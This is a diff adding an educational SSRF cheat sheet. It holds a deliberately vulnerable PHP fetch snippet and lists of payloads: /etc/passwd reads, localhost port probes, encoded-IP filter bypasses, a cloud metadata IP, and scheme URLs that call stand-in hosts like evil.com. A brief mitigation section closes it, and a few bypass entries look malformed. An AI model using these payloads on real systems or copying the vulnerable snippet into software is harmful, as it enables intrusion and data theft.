@@ -1,0 +1,144 @@
+#Attack Classes - SSRF
+
+Server-side request forgery (SSRF) is a web application security vulnerability that occurs when an application fetches a resource from a URL supplied by a user, and an attacker manipulates that URL to make the server send unauthorized requests.
+
+the vulnerable server may send requests to internal services, localhost, private IP ranges, or cloud metadata endpoints. 
+
+*Variants 
+
+[Basic (non-blind) SSRF]
+
+the attacker supplies a malicious URL and directly receives the server’s response. This makes exploitation straightforward because the retrieved data is returned immediately.
+
+[Blind SSRF]
+
+With blind SSRF, the attacker cannot see the response to their payload. Instead, they need to rely on side effects or out-of-band channels, such as:
+
+Triggering an outbound request to an attacker-controlled server
+Observing DNS interactions
+Measuring response timing differences
+
+[Rstrcited SSRF]
+input validation and sanitization restrict certain patterns, but attackers can still bypass filters using encoding tricks, alternative IP representations, or redirect chains.
+
+#Examples Attack
+
+<?php
+  if (isset($_GET['url'])) {
+    $url = $_GET['url'];
+    $image = fopen($url, 'rb');
+    header("Content-Type: image/png");
+    fpassthru($image);
+  }
+?>
+
+#Payload Examples
+
+[Apache Web server with mod_statues]
+
+GET /?url=http://localhost/server-status HTTP/1.1
+
+[Uncommon Schemas]
+
+GET /?url=file:///etc/passwd HTTP/1.1
+
+[cURL request]
+
+GET /?url=dict://localhost:11211/stat HTTP/1.1
+Host: example.com
+
+[Bypass Localhost with IPv6 Notation]
+
+- Using unspecified address in IPv6
+
+http://[::]:80/
+
+- Using IPv6 loopback address [000::1]
+
+http://[0000::1]:80/
+
+Using IPv6/IPv4 Adress embedding 
+
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
+
+[Bypass Localhost with CIDR]
+
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+
+[Bypass using rare address]
+
+http://0/
+http://127.1
+http://127.0.1
+
+[Bypass using an encoded IP address]
+
+-Decimal IP locatio
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/ = http://169.254.169.254
+
+-Octal IP
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+
+-Hex IP
+
+http://0x7f000001 = http://127.0.0.1
+http://0xc0a80101 = http://192.168.1.1
+http://0xa9fea9fe = http://169.254.169.254
+
+*Paload examples - Explotation via URL Schemes
+
+[Files]
+
+file:///etc/passwd
+file://\/\/etc/passwd
+
+[HTTP]
+
+ssrf.php?url=http://127.0.0.1:22
+ssrf.php?url=http://127.0.0.1:80
+ssrf.php?url=http://127.0.0.1:443
+
+[Dict]
+
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+ssrf.php?url=dict://attacker:11111/
+
+[SFTP]
+
+ssrf.php?url=sftp://evil.com:11111/
+
+[TFTP]
+
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
+
+[LDAP]
+
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+
+[Netdoc]
+
+ssrf.php?url=netdoc:///etc/passwd
+
+[Gopher]
+
+gopher://[host]:[port]/[type][selector]
+
+
+*Mitigation of SSRF
+
+Blacklist are a poor methodolody of handleling SSRF. The best methods to handle this form of vurnerability is to Whitelist the hostnames (DNS name) or IP address that is required of your application. If a blacklist is necessary you must properly validate user input.
+
+Eliminated or disable any unesed schemas. if your application on relys on HTTP or HTTPS only allow those schemas. The threat actor will be unable to use the web application to make dangerous request such as  file:///, dict://, ftp://, and gopher://
+
+*Refrences
+https://www.invicti.com/learn/server-side-request-forgery-ssrf?_gl=1*ny9szn*_gcl_au*NTA0NjAzNTcuMTc4MjE2MzY2NQ
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#exploitation-via-url-scheme
